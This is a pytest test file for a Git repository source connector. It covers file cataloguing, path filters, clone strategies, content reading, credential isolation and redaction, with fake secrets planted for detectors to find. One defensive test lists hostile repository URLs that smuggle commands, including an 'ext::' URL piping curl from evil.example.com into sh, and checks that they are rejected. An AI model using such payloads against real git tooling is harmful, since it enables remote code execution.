"""Git source: cataloguing a branch, reading files, and staying isolated.

These run against real repositories created on disk and cloned over ``file://``,
because almost everything worth testing here is an interaction with the git
binary: which arguments produce a tree listing without transferring contents,
what ``ls-tree`` prints for a blob the clone does not hold, whether a submodule
appears as a file. Mocking git out would leave exactly those behaviours untested.
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest

from src.sources.git.source import GitObjectRef, GitSource

pytestmark = pytest.mark.usefixtures("git_binary")


@pytest.fixture(scope="module")
def git_binary() -> str:
    path = subprocess.run(
        ["which", "git"], capture_output=True, text=True, check=False
    ).stdout.strip()
    if not path:  # pragma: no cover - CI images all ship git
        pytest.skip("git is not installed")
    return path


def _git(repo: Path, *args: str) -> str:
    env = {
        **os.environ,
        "GIT_CONFIG_NOSYSTEM": "1",
        "GIT_AUTHOR_NAME": "Test",
        "GIT_AUTHOR_EMAIL": "test@example.com",
        "GIT_COMMITTER_NAME": "Test",
        "GIT_COMMITTER_EMAIL": "test@example.com",
    }
    completed = subprocess.run(
        ["git", *args], cwd=repo, env=env, capture_output=True, text=True, check=True
    )
    return completed.stdout.strip()


@pytest.fixture(scope="module")
def remote_repo(tmp_path_factory) -> Path:
    """A repository with code, config, docs and a large binary, on one branch."""
    repo = tmp_path_factory.mktemp("origin")
    _git(repo, "init", "--initial-branch=main", "--quiet")
    _git(repo, "config", "uploadpack.allowFilter", "true")
    _git(repo, "config", "uploadpack.allowAnySHA1InWant", "true")

    files = {
        "README.md": "# Corpus\n\nA repository used by the Git source tests.\n",
        # First line has two commas, which is exactly the CSV heuristic: this
        # file is why source code needs its extension respected.
        "src/app.py": "from typing import Any, Dict, List\n\nAWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n",
        "src/util.ts": "export const {a, b, c} = require('x');\n",
        "config/values.yaml": "database:\n  password: hunter2\n  host: db.internal\n",
        "docs/guide.md": "Contact ada@example.com for access.\n",
        "docs/archive/old.md": "Superseded.\n",
        "vendor/lib.py": "# third party\n",
        "data/table.csv": "name,email\nAda,ada@example.com\n",
    }
    for name, content in files.items():
        target = repo / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)

    # Larger than the blob_limit threshold used by the tests, so it is left on
    # the server by a filtered clone.
    (repo / "big.bin").write_bytes(b"\x01" * 200_000)
    (repo / "empty.txt").write_text("")
    (repo / "link.md").symlink_to("README.md")

    _git(repo, "add", "-A")
    _git(repo, "commit", "-m", "initial", "--quiet")
    return repo


def _recipe(remote: Path, **overrides) -> dict:
    optional: dict = {"scope": {"branch": "main"}, "connection": {}}
    for section, values in overrides.pop("optional", {}).items():
        optional.setdefault(section, {}).update(values)
    recipe = {
        "type": "GIT",
        "required": {"repository_url": f"file://{remote}"},
        "masked": {},
        "optional": optional,
        "sampling": {"strategy": "ALL"},
    }
    recipe.update(overrides)
    return recipe


def _source(remote: Path, **overrides) -> GitSource:
    return GitSource(_recipe(remote, **overrides), source_id="src-1", runner_id="runner-1")


async def _discover(source: GitSource) -> list:
    source.set_discovery_only(True)
    assets = [asset async for batch in source.extract_raw() for asset in batch]
    source.set_discovery_only(False)
    return assets


# ── cataloguing ──────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_git_source_catalogues_every_tracked_file(remote_repo):
    source = _source(remote_repo)
    try:
        assets = await _discover(source)
    finally:
        source.cleanup()

    keys = {asset.metadata["object_key"] for asset in assets}
    assert "src/app.py" in keys
    assert "config/values.yaml" in keys
    assert "big.bin" in keys
    # Symlinks point at a worktree path that does not exist for a scan, and an
    # empty file has nothing to detect unless it was asked for.
    assert "link.md" not in keys
    assert "empty.txt" not in keys


@pytest.mark.asyncio
async def test_git_source_include_and_exclude_paths_select_folders(remote_repo):
    source = _source(
        remote_repo,
        optional={
            "scope": {
                "include_paths": ["src", "docs"],
                "exclude_paths": ["docs/archive"],
            }
        },
    )
    try:
        assets = await _discover(source)
    finally:
        source.cleanup()

    keys = {asset.metadata["object_key"] for asset in assets}
    assert keys == {"src/app.py", "src/util.ts", "docs/guide.md"}


@pytest.mark.asyncio
async def test_git_source_exclude_paths_accept_globs(remote_repo):
    source = _source(remote_repo, optional={"scope": {"exclude_paths": ["**/*.md", "vendor"]}})
    try:
        assets = await _discover(source)
    finally:
        source.cleanup()

    keys = {asset.metadata["object_key"] for asset in assets}
    assert not any(key.endswith(".md") for key in keys)
    assert not any(key.startswith("vendor/") for key in keys)
    assert "src/app.py" in keys


@pytest.mark.asyncio
async def test_git_source_extension_filters_apply(remote_repo):
    source = _source(remote_repo, optional={"scope": {"include_extensions": [".py", ".yaml"]}})
    try:
        assets = await _discover(source)
    finally:
        source.cleanup()

    keys = {asset.metadata["object_key"] for asset in assets}
    assert keys == {"src/app.py", "vendor/lib.py", "config/values.yaml"}


@pytest.mark.asyncio
async def test_git_source_includes_empty_files_when_asked(remote_repo):
    source = _source(remote_repo, optional={"scope": {"include_empty_objects": True}})
    try:
        assets = await _discover(source)
    finally:
        source.cleanup()

    assert "empty.txt" in {asset.metadata["object_key"] for asset in assets}


# ── asset shape ──────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_git_source_asset_metadata_conforms_to_the_catalog(remote_repo):
    """metadata_fields raises under pytest when a key is undeclared or missing."""
    source = _source(remote_repo)
    try:
        assets = await _discover(source)
    finally:
        source.cleanup()

    asset = next(a for a in assets if a.metadata["object_key"] == "src/app.py")
    assert asset.asset_kind == "file"
    assert asset.metadata["provider"] == "GIT"
    assert asset.metadata["repository_url"].startswith("file://")
    assert asset.metadata["branch"] == "main"
    assert len(asset.metadata["commit_sha"]) == 40
    assert len(asset.metadata["blob_id"]) == 40
    # The blob id is a content hash, which is what lets the scan cache skip an
    # unchanged file without re-reading it.
    assert asset.metadata["blob_id"] == asset.metadata["etag"]


@pytest.mark.asyncio
async def test_git_source_external_url_identifies_repository_branch_and_path(remote_repo):
    source = _source(remote_repo)
    try:
        assets = await _discover(source)
    finally:
        source.cleanup()

    asset = next(a for a in assets if a.metadata["object_key"] == "src/app.py")
    assert asset.external_url == f"git+file://{remote_repo}@main/src/app.py"


def test_git_source_external_url_strips_inline_credentials():
    source = GitSource(
        {
            "type": "GIT",
            "required": {"repository_url": "https://user:sup3rsecret@git.example.com/a/b.git"},
            "masked": {},
            "optional": {},
            "sampling": {"strategy": "ALL"},
        }
    )
    url = source._external_url("a.txt")
    assert "sup3rsecret" not in url
    assert url.startswith("git+https://git.example.com/a/b.git@")


@pytest.mark.parametrize(
    ("host", "expected"),
    [
        ("https://github.com/acme/repo.git", "https://github.com/acme/repo/blob/main/a/b.py"),
        ("https://gitlab.com/acme/repo.git", "https://gitlab.com/acme/repo/-/blob/main/a/b.py"),
        ("https://bitbucket.org/acme/repo.git", "https://bitbucket.org/acme/repo/src/main/a/b.py"),
        ("ssh://git@internal.example.com/acme/repo.git", None),
    ],
)
def test_git_source_web_url_is_host_aware(host, expected):
    source = GitSource(
        {
            "type": "GIT",
            "required": {"repository_url": host},
            "masked": {},
            "optional": {},
            "sampling": {"strategy": "ALL"},
        }
    )
    source._resolved_branch = "main"
    assert source._web_url("a/b.py") == expected


# ── reading contents ─────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_git_source_reads_code_files_as_text(remote_repo):
    """A .py file must reach the detectors as the characters it contains.

    Content sniffing alone reads `from typing import Any, Dict, List` as a CSV
    header, which would hand the detectors three garbage columns instead of the
    hard-coded key on line three.
    """
    source = _source(remote_repo)
    try:
        assets = await _discover(source)
        asset = next(a for a in assets if a.metadata["object_key"] == "src/app.py")
        assert asset.metadata["mime_type"] == "text/x-python"
        pages = [page async for _raw, page in source.fetch_content_pages(asset.hash)]
    finally:
        source.cleanup()

    assert any("AKIAIOSFODNN7EXAMPLE" in page for page in pages)


@pytest.mark.asyncio
async def test_git_source_reads_yaml_configuration_as_text(remote_repo):
    source = _source(remote_repo)
    try:
        assets = await _discover(source)
        asset = next(a for a in assets if a.metadata["object_key"] == "config/values.yaml")
        pages = [page async for _raw, page in source.fetch_content_pages(asset.hash)]
    finally:
        source.cleanup()

    assert any("hunter2" in page for page in pages)


@pytest.mark.asyncio
async def test_git_source_reads_tabular_files_row_by_row(remote_repo):
    source = _source(remote_repo)
    try:
        assets = await _discover(source)
        asset = next(a for a in assets if a.metadata["object_key"] == "data/table.csv")
        pages = [page async for _raw, page in source.fetch_content_pages(asset.hash)]
    finally:
        source.cleanup()

    assert any("ada@example.com" in page for page in pages)


# ── transfer strategy ────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_blob_limit_clone_defers_only_the_large_files(remote_repo):
    """The default: small files arrive with the tree, large ones stay behind.

    Their size cannot be reported for a blob the clone does not hold — git has no
    way to answer without fetching it — so it is declared unknown rather than
    guessed at.
    """
    source = _source(remote_repo, optional={"connection": {"max_object_bytes": 4096}})
    try:
        refs = {ref.key: ref for ref in source._list_objects()}
    finally:
        source.cleanup()

    assert refs["src/app.py"].size_known is True
    assert refs["src/app.py"].size > 0
    assert refs["big.bin"].size_known is False
    assert refs["big.bin"].size == 0


@pytest.mark.asyncio
async def test_blobless_clone_catalogues_the_tree_without_any_contents(remote_repo):
    source = _source(remote_repo, optional={"connection": {"clone_strategy": "blobless"}})
    try:
        refs = {ref.key: ref for ref in source._list_objects()}
        # Every file is catalogued from Git metadata alone…
        assert "src/app.py" in refs
        assert refs["src/app.py"].size_known is False
        assert len(refs["src/app.py"].blob_id) == 40
        # …and one file's bytes are fetched on their own when it is read.
        content = b"".join(source._stream_object(refs["src/app.py"]))
    finally:
        source.cleanup()

    assert b"AKIAIOSFODNN7EXAMPLE" in content


@pytest.mark.asyncio
async def test_full_clone_reports_every_size(remote_repo):
    source = _source(remote_repo, optional={"connection": {"clone_strategy": "full"}})
    try:
        refs = {ref.key: ref for ref in source._list_objects()}
    finally:
        source.cleanup()

    assert all(ref.size_known for ref in refs.values())
    assert refs["big.bin"].size == 200_000


@pytest.mark.asyncio
async def test_a_file_whose_size_is_unknown_is_not_expanded_during_discovery(remote_repo):
    """A deferred file must not be downloaded just to look for children inside it.

    Fetching it during discovery is exactly what the filtered clone exists to
    avoid, so an unmeasured file is treated the way a known-oversized one is.
    """
    source = _source(remote_repo, optional={"connection": {"max_object_bytes": 4096}})
    ref = GitObjectRef(
        key="bundle.zip",
        size=0,
        last_modified=source._parse_datetime("2026-01-01T00:00:00Z"),
        etag="a" * 40,
        blob_id="a" * 40,
        size_known=False,
    )
    try:
        assert source._is_container_object(ref) is False
    finally:
        source.cleanup()


@pytest.mark.asyncio
async def test_per_file_commit_dates_are_read_from_history(remote_repo):
    """LATEST and AUTOMATIC order by these, so they must be the file's own date."""
    source = _source(
        remote_repo,
        optional={"scope": {"include_last_commit": True}, "connection": {"depth": 0}},
    )
    try:
        refs = {ref.key: ref for ref in source._list_objects()}
    finally:
        source.cleanup()

    assert refs["src/app.py"].last_modified is not None
    assert refs["src/app.py"].last_modified.tzinfo is not None


# ── isolation and credentials ────────────────────────────────────────────


def test_git_environment_is_sealed_off_from_the_runner(remote_repo):
    """A scan must authenticate with the source's credentials and nothing else.

    The failure this prevents is silent: a runner with a working ~/.gitconfig or
    an ssh-agent would let a misconfigured source succeed against a repository it
    was never given access to, and the next job inherit the same ambient login.
    """
    source = _source(remote_repo)
    try:
        env = source._git_env()
        workspace = source._workspace_dir()

        assert env["GIT_CONFIG_NOSYSTEM"] == "1"
        assert env["GIT_CONFIG_GLOBAL"] == os.devnull
        assert env["GIT_TERMINAL_PROMPT"] == "0"
        assert Path(env["HOME"]).is_relative_to(workspace)

        config = {
            env[f"GIT_CONFIG_KEY_{index}"]: env[f"GIT_CONFIG_VALUE_{index}"]
            for index in range(int(env["GIT_CONFIG_COUNT"]))
        }
        assert config["credential.helper"] == ""
        assert config["protocol.ext.allow"] == "never"
    finally:
        source.cleanup()


def test_a_token_never_reaches_the_command_line():
    """Anything in argv is readable by every other process on the host."""
    source = GitSource(
        {
            "type": "GIT",
            "required": {"repository_url": "https://github.com/acme/private.git"},
            "masked": {"token": "ghp_sup3rsecret"},
            "optional": {"auth": {"auth_method": "token"}},
            "sampling": {"strategy": "ALL"},
        }
    )
    try:
        env = source._git_env()
        assert not any("ghp_sup3rsecret" in argument for argument in source._clone_arguments())

        header = next(
            env[f"GIT_CONFIG_VALUE_{index}"]
            for index in range(int(env["GIT_CONFIG_COUNT"]))
            if env[f"GIT_CONFIG_KEY_{index}"] == "http.extraHeader"
        )
        assert header.startswith("Authorization: Basic ")
        # GitHub rejects a token sent under the wrong username with an opaque
        # 403, so the host's convention is applied for the user.
        import base64

        decoded = base64.b64decode(header.split()[-1]).decode()
        assert decoded == "x-access-token:ghp_sup3rsecret"
    finally:
        source.cleanup()


def test_git_output_is_redacted_before_it_is_logged():
    source = GitSource(
        {
            "type": "GIT",
            "required": {"repository_url": "https://git.example.com/a/b.git"},
            "masked": {"token": "ghp_sup3rsecret"},
            "optional": {"auth": {"auth_method": "token"}},
            "sampling": {"strategy": "ALL"},
        }
    )
    message = source._redact(
        "fatal: could not read https://user:ghp_sup3rsecret@git.example.com/a/b.git"
    )
    assert "ghp_sup3rsecret" not in message
    assert "user:" not in message


def test_missing_credentials_fail_with_an_actionable_message():
    source = GitSource(
        {
            "type": "GIT",
            "required": {"repository_url": "https://git.example.com/a/b.git"},
            "masked": {},
            "optional": {"auth": {"auth_method": "token"}},
            "sampling": {"strategy": "ALL"},
        }
    )
    with pytest.raises(ValueError, match=r"masked\.token"):
        source._git_env()
    source.cleanup()


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c 'curl evil.example.com | sh'",
        "--upload-pack=touch /tmp/pwned",
        "shell::whoami",
    ],
)
def test_a_repository_url_that_is_really_a_command_is_refused(url):
    """`ext::` makes the remote an arbitrary command, so it can never be a URL."""
    source = GitSource(
        {
            "type": "GIT",
            "required": {"repository_url": url},
            "masked": {},
            "optional": {},
            "sampling": {"strategy": "ALL"},
        }
    )
    with pytest.raises(ValueError):
        source._repository_url()


def test_cleanup_removes_the_clone_and_every_secret(remote_repo):
    """The desktop application runs many scans in one process; nothing may persist."""
    source = GitSource(
        {
            "type": "GIT",
            "required": {"repository_url": f"file://{remote_repo}"},
            "masked": {"ssh_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\nkey\n"},
            "optional": {"auth": {"auth_method": "ssh_key"}},
            "sampling": {"strategy": "ALL"},
        }
    )
    workspace = source._workspace_dir()
    source._git_env()
    assert (workspace / "id_key").exists()
    assert (workspace / "id_key").stat().st_mode & 0o077 == 0

    source.cleanup()
    assert not workspace.exists()


@pytest.mark.asyncio
async def test_two_scans_of_the_same_repository_do_not_share_a_clone(remote_repo):
    first = _source(remote_repo)
    second = _source(remote_repo)
    try:
        first._repo()
        second._repo()
        assert first._workspace_dir() != second._workspace_dir()
    finally:
        first.cleanup()
        second.cleanup()


# ── connection test ──────────────────────────────────────────────────────


def test_test_connection_succeeds_without_cloning(remote_repo):
    source = _source(remote_repo)
    result = source.test_connection()
    assert result["status"] == "SUCCESS"
    assert "branch main" in result["message"]
    # ls-remote only transfers the ref advertisement.
    assert source._repo_dir is None


def test_test_connection_reports_a_missing_branch(remote_repo):
    source = _source(remote_repo, optional={"scope": {"branch": "does-not-exist"}})
    result = source.test_connection()
    assert result["status"] == "FAILURE"
    assert "does-not-exist" in result["message"]


def test_test_connection_reports_an_unreachable_repository(tmp_path):
    source = GitSource(
        {
            "type": "GIT",
            "required": {"repository_url": f"file://{tmp_path}/nope.git"},
            "masked": {},
            "optional": {},
            "sampling": {"strategy": "ALL"},
        }
    )
    result = source.test_connection()
    assert result["status"] == "FAILURE"


# ── path matching ────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("path", "pattern", "matches"),
    [
        ("docs/guide.md", "docs", True),
        ("docs/a/b/guide.md", "docs", True),
        ("docsy/guide.md", "docs", False),
        ("docs", "docs", True),
        ("src/app.py", "**/*.py", True),
        ("app.py", "**/*.py", True),
        ("src/app.ts", "**/*.py", False),
        ("a/testdata/x.json", "**/testdata/*", True),
    ],
)
def test_path_matching_accepts_folders_and_globs(path, pattern, matches):
    assert GitSource._path_matches(path, pattern) is matches
